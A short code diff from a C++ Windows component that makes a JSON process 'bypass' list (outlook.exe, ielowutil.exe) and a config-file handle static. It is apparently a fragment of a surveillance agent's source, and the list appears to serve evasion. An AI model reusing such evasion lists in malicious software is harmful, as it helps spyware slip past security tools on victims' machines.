@@ -5,7 +5,7 @@
 #include "H4-DLL.h"
 #include "LOG.h"
 
-const char* bypass_json_list = R"(
+static const char* bypass_json_list = R"(
 [
 	{ "processName:": "outlook.exe", "description": "*Outlook*"},
 	{ "processName:": "ielowutil.exe" },
@@ -37,7 +37,7 @@ const char* bypass_json_list = R"(
 )";
 
 // Usata per lockare il file di conf
-HANDLE conf_file_handle = NULL;
+static HANDLE conf_file_handle = NULL;
 
 // Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
 typedef void (WINAPI* conf_callback_t)(JSONObject, DWORD counter);
